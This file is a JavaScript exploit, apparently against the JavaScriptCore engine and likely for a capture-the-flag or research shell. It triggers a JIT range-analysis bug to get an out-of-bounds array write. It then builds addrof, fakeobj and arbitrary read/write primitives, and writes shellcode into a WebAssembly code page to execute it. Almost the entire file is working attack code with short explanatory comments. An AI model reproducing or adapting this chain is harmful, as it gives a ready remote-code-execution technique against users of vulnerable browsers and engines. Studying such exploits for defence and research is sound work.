var tmp_buf = new ArrayBuffer(8);
var f64 = new Float64Array(tmp_buf);
var u32 = new Uint32Array(tmp_buf);
var BASE = 0x100000000;

function f2i(f) {
    f64[0] = f;
    return u32[0] + BASE*u32[1];
}
function i2f(i) {
    u32[0] = i % BASE;
    u32[1] = i / BASE;
    return f64[0];
}
function hex(x) {
    if (x < 0) return `-${hex(-x)}`;
    return `0x${x.toString(16)}`;
}

function hax(arr, a) {
    // Force 32-bit integer
    let b = a | 0;
    // Setup bug trigger
    // compiler assumes range is [1, 2], actually [0, 2]
    let c = b & 2;
    // Trigger rangeFor
    // assumed range [0, 1], actual [-1, 1]
    let idx = c - 1;

    // Check will always pass
    if (idx < arr.length) {
        // Trigger integer underflow, idx will become INT_MAX
        // Compiler assumes this case only triggers for value 0, no underflow check
        if (idx < 1) {
            idx += -0x80000000;
        }
        // Use this to set oob write index
        if (idx > 2) {
            idx += -0x7ffffffa;
        }
        // idx assumed to be < arr.length, only subtraction occurs so upper bound is unchecked
        // Overwrite length of array to 0x1337
        if (idx > 0) {
            arr[idx] = 0x1337;
        }
    }
}

noInline(hax);

var arr = new Array(5);
var dblarr = new Array(5);
var objarr = new Array(5);
arr.fill(1);
dblarr.fill(13.37);
objarr.fill({});

function trigger() {
    for (var i = 0; i < 100000; ++i) {
        hax(arr, 2);
    }
    hax(arr, 1);

}

noDFG(trigger);
noFTL(trigger);
trigger();

let offset = 0x6;

function addrof(obj) {
    objarr[0] = obj;
    return f2i(dblarr[offset]);
}
function fakeobj(addr) {
    dblarr[offset] = i2f(addr);
    return objarr[0];
}

var fake1 = new Array(5);
fake1.fill(13.37);

// Fake double object, use strid leak
u32[1] = 0x1082407;
u32[0] = Reflect.strid(fake1);

var fake_header = f64[0];

var container = {
    x: fake_header,
    y: fakeobj(addrof(fake1) + 8)
}

var fake = fakeobj(addrof(container) + 0x10);

function read(addr) {
    fake[0] = i2f(addr);
    return f2i(fake1[0]);
}

function write(addr, val) {
    fake[0] = i2f(addr);
    fake1[0] = val;
}

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;
var addr_f = addrof(f);
var addr_shellcode = read(read(addr_f + 0x30));

let shellcode = [
    2.825563119134789e-71, 3.2060568105999132e-80,
    -2.5309726874116607e+35, 7.034840446283643e-309
]

for(var i = 0; i < shellcode.length; i++) {
    write(addr_shellcode + i*8, shellcode[i]);
}

f();
